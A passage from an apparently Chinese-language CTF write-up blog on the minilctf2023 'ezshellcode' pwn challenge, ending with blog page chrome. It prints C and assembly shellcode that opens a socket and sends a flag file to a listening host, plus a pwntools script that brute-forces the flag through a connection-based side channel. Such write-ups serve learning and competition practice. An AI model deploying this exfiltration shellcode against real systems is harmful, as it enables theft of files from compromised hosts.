class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> soc_fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">        addr.sin_family = AF_INET;</span><br><span class="line">        addr.sin_port = htons(<span class="number">6789</span>);                            <span class="comment">//确定端口号</span></span><br><span class="line">        addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);      <span class="comment">//确定ip地址</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> fd = connect(soc_fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">off_t</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> flag1 = open(<span class="string">&quot;./flag1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        read(flag1, buffer, <span class="number">0x10</span>);</span><br><span class="line">        <span class="type">int</span> n = sendfile(soc_fd, flag1, &amp;offset, <span class="number">0x50</span>);</span><br><span class="line">        close(flag1);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们在本机上<code>nc -lp 6789</code>就可以接收到了</p>
+<p>最后可以直接调试这个程序，把打远程要用的参数直接复制过去，要打远程貌似还得有个外网ip，然后把上面程序中的ip和端口改成外网ip就行了，至于shellcode的编写，我是这样写的</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* socket(2, 1, 0) */</span></span><br><span class="line"><span class="string">    mov al, 41</span></span><br><span class="line"><span class="string">    mov edi, 2</span></span><br><span class="line"><span class="string">    inc esi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* connect(soc_fd, &amp;addr, addr_len) */</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    add cl, 0x25</span></span><br><span class="line"><span class="string">    mov rsi, rcx</span></span><br><span class="line"><span class="string">    mov dx, 0x10</span></span><br><span class="line"><span class="string">    mov al, 42</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* sendfile(soc_fd, 4, &amp;offset, len) */</span></span><br><span class="line"><span class="string">    mov rsi, 4</span></span><br><span class="line"><span class="string">    lea rdx, [rcx+0x2090]</span></span><br><span class="line"><span class="string">    mov r10, r11</span></span><br><span class="line"><span class="string">    mov al, 40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.send(asm(shellcode).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0xaa99ec73ced40002</span>)+p64(<span class="number">0</span>))   <span class="comment">#后面加的是要connect的地址</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>虽然我知道这个flag要用侧信道出，但是我前面的思路基本上都是错的。网上很多都是利用<code>recv(timeout)</code>判断的，但是这个题把所有流(stdin, stdout, stderr)都关闭了，因此用一般的方法根本判断不了。还是要用题目中的系统调用来判断，具体判断原理是当程序进入循环的话，程序不会终止，因此与远程的connect也不会断开，而直接退出就会断开。<strong>具体可以用nc连接本机尝试<code>nc -lp 6789</code>监听本机6789端口，然后<code>nc 127.0.0.1 6789</code>连接本机，然后退出一方看另一方的变化</strong>（这个点也是bb提示的，不如说已经不叫提示了，叫明示了，我对nc的使用还停留在<code>nc ip port</code>），退出和进入循环返回的信息是不一样的。（事实上在被提示完之后，我是又写了一个服务端用socket来接收，因为我pwntools不会<code>process([&quot;nc&quot;, &quot;-lp&quot;, &quot;6789&quot;])</code>。🐎的，真shabi啊，我究竟在干神么</p>
+<p>那思路就基本确定了，<strong>编写shellcode连接到本机，然后根据连接的状态来判断程序是进入循环还是退出。</strong>但这里还有一个地方我弄的不对，就是如何回到栈，我使用了<code>_environ</code>变量，因为mmap的位置恰好和ld位置相邻，然后中间就没有ASLR产生的偏移，但是我尝试之后发现不对，应该是因为小版本的偏移也会有一定变化。这里在bb的明示下，知道了还可以用段寄存器来回到栈，之前从来没注意过。最后本地复现基本可以爆出来flag，虽然会有一点误差，但基本准确。总之学到了很多，还是太菜了</p>
+<p>exp</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#侧信道爆破</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    <span class="comment">#p = remote(&#x27;pwn.blackbird.wang&#x27;, 9550)</span></span><br><span class="line">    q = process([<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-lp&quot;</span>, <span class="string">&quot;6789&quot;</span>])</span><br><span class="line">    p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    <span class="comment">#attach(p)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                mov al, 0x29</span></span><br><span class="line"><span class="string">                mov dil, 2</span></span><br><span class="line"><span class="string">                mov sil, 1</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                xchg edi, eax;</span></span><br><span class="line"><span class="string">                mov rbx, 0x100007f851a0002</span></span><br><span class="line"><span class="string">                push rbx</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                mov al, 0x2a</span></span><br><span class="line"><span class="string">                mov dl, 0x10;</span></span><br><span class="line"><span class="string">                push rsp;</span></span><br><span class="line"><span class="string">                pop rsi;</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                sub sp, 2136</span></span><br><span class="line"><span class="string">                mov dl,byte ptr [rsp+<span class="subst">&#123;pos&#125;</span>]</span></span><br><span class="line"><span class="string">                mov cl,<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span></span></span><br><span class="line"><span class="string">                cmp dl,cl</span></span><br><span class="line"><span class="string">                jz loop</span></span><br><span class="line"><span class="string">                mov al,0x3c</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                loop:</span></span><br><span class="line"><span class="string">                jmp loop</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.send(asm(shellcode))</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;!#$%&amp;-_0123456789?=@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz&#123;&#125;|&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        pwn(pos, char)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> q.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            q.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            q.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    flag+=char</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p>测试的flag是<code>flag1&#123;this_is_flag1&#125;</code>，<code>sleep(0.1)</code>爆出来是<code>flag1&#123;Dhis_is_f3ag1&#125;</code>，<code>sleep(0.2)</code>就完全爆出来了。远程的话sleep时长再改大点应该就没问题了。</p>
+<h2 id="ezbook"><a href="#ezbook" class="headerlink" title="ezbook"></a>ezbook</h2><p>似乎是一道线程竞争的题</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> minilctf2023 pwn wp &amp; 复现</li>
+        <li><strong>Author:</strong> Static</li>
+        <li><strong>Created at
+                :</strong> 2024-03-10 16:34:36</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-03-10 16:34:32
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://staticccccccc.github.io/2024/03/10/CTFS-wp/minilctf2023 wp/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/03/10/CTFS-wp/%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B%20wp%20&amp;%20%E5%A4%8D%E7%8E%B0/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">陕西省省赛 wp &amp; 复现</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/03/10/CTFS-wp/Hgame%202023%20%E9%83%A8%E5%88%86wp/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hgame 2023 pwn部分wp</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">minilctf2023 pwn wp &amp; 复现</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#3calls"><span class="nav-text">3calls</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#broken-machine"><span class="nav-text">broken_machine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#twins"><span class="nav-text">twins</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezshellcode"><span class="nav-text">ezshellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flag2"><span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag1"><span class="nav-text">flag1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezbook"><span class="nav-text">ezbook</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Static</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
